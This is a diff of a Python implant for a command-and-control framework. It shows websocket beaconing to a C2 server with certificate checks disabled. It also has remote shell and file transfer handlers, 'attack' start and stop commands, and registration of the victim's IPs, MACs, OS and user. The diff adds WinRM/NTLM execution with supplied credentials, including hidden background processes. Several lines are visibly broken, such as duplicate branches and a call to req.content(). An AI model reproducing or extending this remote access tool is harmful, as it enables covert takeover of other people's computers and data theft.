@@ -11,15 +11,14 @@ import random
 import threading
 import time
 import re
-import platform
-import netifaces
+import winrm
 import ssl
-from requests.adapters import HTTPAdapter
-from urllib3.util.ssl_ import create_urllib3_context
-import urllib3
 from websockets import connect
 from websockets.exceptions import ConnectionClosedError, ConnectionClosedOK
 from typing import List, Dict, Tuple, Optional
+from requests.adapters import HTTPAdapter
+from urllib3.util.ssl_ import create_urllib3_context
+import urllib3
 import requests
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
@@ -36,7 +35,7 @@ class SSLAdapter(HTTPAdapter):
 
 
 class Impl:
-    def __init__(self, c2_ws_url: str, group: str = "grupo", sess_key: str = ""):
+    def __init__(self, c2_ws_url: str, group: str = "aaaaaa", sess_key: str = ""):
             self.c2_ws_url = c2_ws_url
             self.group = group
             self.sess_key = sess_key
@@ -77,7 +76,6 @@ class Impl:
     
     async def _connect_to_c2(self) -> None:
         try:
-            # Crear contexto SSL que ignore certificados autofirmados
             ssl_context = ssl.create_default_context()
             ssl_context.check_hostname = False
             ssl_context.verify_mode = ssl.CERT_NONE
@@ -88,16 +86,11 @@ class Impl:
                 ping_timeout=10,
                 close_timeout=10,
                 open_timeout=30,
-                ssl=ssl_context  # Añadir contexto SSL
+                ssl=ssl_context  
             ) as ws:
                 self.retry_count = 0  
 
-                                
-                rec = await asyncio.wait_for(ws.recv(), timeout=60)
 
-                if "Invalid conection" in str(rec).strip():
-                    sys.exit(0)
-                
                 while self.running:
                     try:
                         await self._handle_commands(ws)
@@ -108,19 +101,25 @@ class Impl:
                         
         except Exception as e:
             raise
+        
+
 
     async def _handle_commands(self, ws) -> None:
         try:
             
             cmd = await asyncio.wait_for(ws.recv(), timeout=60)
             data = json.loads(cmd)
-
+                                            
             if 'cmd' in data:
                 await self._execute_command(ws, data['cmd'])
             elif 'chunk' in data:
                 await self._handle_file_upload(ws, data)
             elif 'list_files' in data:
                 await self._list_directory(ws, data.get('path', self.current_dir))
+            elif "Invalid conection" in data:
+                sys.exit(0)
+            elif "Invalid conection" in data:
+                sys.exit(0)
             elif 'get_files' in data:
                 await self._send_file(ws, data['get_files'])
             elif 'attack' in data:
@@ -129,7 +128,7 @@ class Impl:
                 await self._stop_attack(ws, attack_type=data['stop_attack'])
             elif 'finish' in data:
                 await self._exit(ws)
-        
+
         except asyncio.TimeoutError:
             
             pass
@@ -140,8 +139,6 @@ class Impl:
                 await ws.send(json.dumps({"result": f"Error: {str(e)}"}))
             except:
                 pass  
-
-
 
     async def _execute_command(self, ws, command: str):
 
@@ -168,8 +165,8 @@ class Impl:
                 }, ensure_ascii=False))
 
             except Exception as e:
-                print(e)
-                print("eerr")
+                pass
+                
 
         else:
             out, err, _ = self._execute_shell_command(command)
@@ -190,73 +187,122 @@ class Impl:
     async def _execute_as_user(self, command_with_credentials: str):
         try:
             parts = shlex.split(command_with_credentials)
-            if len(parts) < 3 or len(parts) > 4:
-                return "Error: Wrong format. Use: exec_as <user> <password> <host (localhost by default)> <command>"
 
             username = parts[0]
             password = parts[1]
-            if len(parts) == 3:
-                host = "localhost"
-                actual_command = parts[2]
-            else:
-                host = parts[2]
-                actual_command = parts[3]
+            actual_command = parts[2:]
+
 
             domain = os.environ.get("USERDOMAIN", "WORKGROUP")
 
-            result = await self._execute_powershell_as_user(actual_command, username, domain, password, host)
+            result = await self.execute_command_as_user(actual_command, username, domain, password)
 
             return result
        
         except Exception as e:
-            print("Erro in execute as user")
+            
             return f"Errorr: {e}"
         
 
 
-        
-    async def _execute_powershell_as_user(self, command, username, domain, password, host="localhost"):
-
+    async def execute_command_as_user(self, command, username, domain, password):
         try:
-            escaped_password = password.replace("'", "''")
+            run_in_background =  command[-1] == "&"
 
-            ps_script = f"""
-            $securePassword = ConvertTo-SecureString '{escaped_password}' -AsPlainText -Force
-            $credential = New-Object System.Management.Automation.PSCredential('{domain}\\{username}', $securePassword)
+            if run_in_background:
+                command.remove("&")
 
-            try {{
-                $result = Invoke-Command -ComputerName {host} -Credential $credential -ScriptBlock {{
-                    Set-Location '{self.current_dir}'
-                    if ($args[0] -match '\\.(exe|com|bat|cmd|msi)$' -or $args[0] -match '^(calc|notepad|mspaint|winword|excel|powerpnt)') {{
-                        & $args[0] 2>&1 | Out-String
-                    }} else {{
-                        Invoke-Expression $args[0] 2>&1 | Out-String
-                    }}
-                }} -ArgumentList '{command}' -ErrorAction Stop
 
-                Write-Output "$result"
-            }} catch {{
-                Write-Output "ERROR:$($_.Exception.Message)"
-            }}
-            """
 
-            process = await asyncio.create_subprocess_exec(
-                "powershell.exe",
-                "-NoProfile", "-ExecutionPolicy", "Bypass",
-                "-Command", ps_script,
-                stdout=asyncio.subprocess.PIPE,
-                stderr=asyncio.subprocess.PIPE,
-                cwd=self.current_dir
+            return await self._execute_winrm_command(
+                command, username, domain, password, "localhost", 
+                run_in_background
             )
 
-            stdout, stderr = await process.communicate()
 
-            if stderr:
-                return "ERROR: (Input may be wrong) " + stderr.decode(errors="ignore")
-            return stdout.decode(errors="ignore")
+        except Exception as ex:
+            return f"Error executing command: {str(ex)}"
 
-        except Exception as e:
-            return f"Error executing commands: {e}"
+
+    async def _execute_winrm_command(self, command: str, username: str, domain: str, 
+                                   password: str, host: str, run_in_background: bool,
+                                   output_file: Optional[str] = None, 
+                                   append: bool = False) -> str:
+        """
+        Ejecuta el comando a través de WinRM con todas las funcionalidades
+        """
+        try:
+
+            session = winrm.Session(
+                host,
+                auth=(f"{domain}\\{username}", password),
+                transport='ntlm'
+            )
+            
+            if run_in_background:
+                
+                try:
+                    bg_command = f' {' '.join(f'{arg}' for arg in command)}'
+                    
+                    bg_command = f'Start-Process {bg_command} -WindowStyle Hidden -PassThru'
+
+                    result = session.run_ps(bg_command)
+
+                    
+
+                    if result.status_code == 0:
+                        pid_match = re.search(r'Id\s*:\s*(\d+)', result.std_out.decode('utf-8'))
+                        if pid_match:
+                            return f"Process {pid_match.group(1)} started in background."
+                        return "Process started in background."
+                    else:
+                        error = result.std_err.decode('utf-8', errors='ignore')
+                        return f"ERROR starting background process: {error}"
+                except Exception as e:
+                    pass
+            
+            else:
+
+                try:
+
+                    result = session.run_ps(' '.join(f'{arg}' for arg in command))
+                    
+                    output = result.std_out.decode('utf-8', errors='ignore')
+                    error = result.std_err.decode('utf-8', errors='ignore')
+                    
+                    final_output = ""
+                    if result.status_code != 0:
+                        final_output = f"ERROR: {error}"
+                    else:
+                        final_output = output
+                    
+                except Exception as e:
+                    pass
+                if output_file:
+                    try:
+                        mode = 'a' if append else 'w'
+                        encoding = 'utf-8'
+                        
+                        if output_file:
+                            if append:
+                                append_cmd = f'Add-Content -Path "{output_file}" -Value @\"\n{final_output}\n\"@'
+                            else:
+                                append_cmd = f'Set-Content -Path "{output_file}" -Value @\"\n{final_output}\n\"@'
+                            
+                            file_result = session.run_ps(append_cmd)
+                            if file_result.status_code == 0:
+                                final_output = f"Output redirected to {output_file}"
+                            else:
+                                file_error = file_result.std_err.decode('utf-8', errors='ignore')
+                                final_output = f"Error redirecting output: {file_error}"
+                    
+                    except Exception as file_ex:
+                        final_output = f"Error handling file redirection: {str(file_ex)}"
+                
+                return final_output
+                
+        except Exception as ex:
+            return f"WinRM execution error: {str(ex)}"
 
     
     async def _change_directory(self, ws, path: str) -> None:
@@ -642,50 +688,47 @@ class Impl:
 
     
     async def register(self) -> bool:
-       
-        model = {
-            'impl_mac': self._get_macs(),
-            'group': self.group,
-            'public_ip': self._get_public_ip(),
-            'local_ip': self._get_local_ips(),
-            'operating_system': self._get_operating_system(),
-            'impl_id': f"{self.impl_id}-root={self._get_root()}-user={self._get_user()}".lower(),
-            'root': self._get_root(),
-            'user': self._get_user(),
-            'sess_key': self.sess_key
-
-        }
-
         
+            model = {
+                'impl_mac': self._get_macs(),
+                'group': self.group,
+                'public_ip': self._get_public_ip(),
+                'local_ip': self._get_local_ips(),
+                'operating_system': self._get_operating_system(),
+                'impl_id': f"{self.impl_id}-root={self._get_root()}-user={self._get_user()}".lower(),
+                'root': self._get_root(),
+                'user': self._get_user(),
+                'sess_key': self.sess_key
+            }
+
+            session = requests.Session()
+            session.mount('https://', SSLAdapter())
+
+            max_attempts = 3
+
+            for attempt in range(max_attempts):
+                if attempt < max_attempts - 1:
+                    await asyncio.sleep(1)
+                try:
+                    req = session.post(
+                        f"https://{self.c2_ws_url}/api/impl/new/{model['impl_id']}".lower(),
+                        data=model,
+                        timeout=10,
+                        verify=False 
+                    )
+
+                    if "Invalid session key" in req.content():
+                        sys.exit(0)
+                    if req.status_code == 200:
+                        return True
+                    else:
+                        return False
+                except Exception as e:
+
+                    return False 
+            
+            return False
         
-        session = requests.Session()
-        session.mount('https://', SSLAdapter())
-
-        max_attempts = 3
-
-        for attempt in range(max_attempts):
-            if attempt < max_attempts - 1:
-                await asyncio.sleep(1)
-            try:
-                req = session.post(
-                    f"https://{self.c2_ws_url}/api/impl/new/{model['impl_id']}".lower(),
-                    data=model,
-                    timeout=10,
-                    verify=False 
-                )
-
-                if "Invalid session key" in req.content():
-                    sys.exit(0)
-
-                if req.status_code == 200:
-                    return True
-                else:
-                    return False
-            except Exception as e:
-
-                return False 
-        
-        return False
         
 
     @property
@@ -737,6 +780,7 @@ if __name__ == "__main__":
     GROUP_NAME = "grupo"
     SESS_KEY = "1234567"
     
+
     
     impl = Impl(c2_ws_url=C2_WS_URL, group=GROUP_NAME, sess_key=SESS_KEY)
     
@@ -748,7 +792,6 @@ if __name__ == "__main__":
     signal.signal(signal.SIGTERM, signal_handler)
 
     try:
-
         asyncio.run(impl.run())
     except KeyboardInterrupt:
         impl.running = False
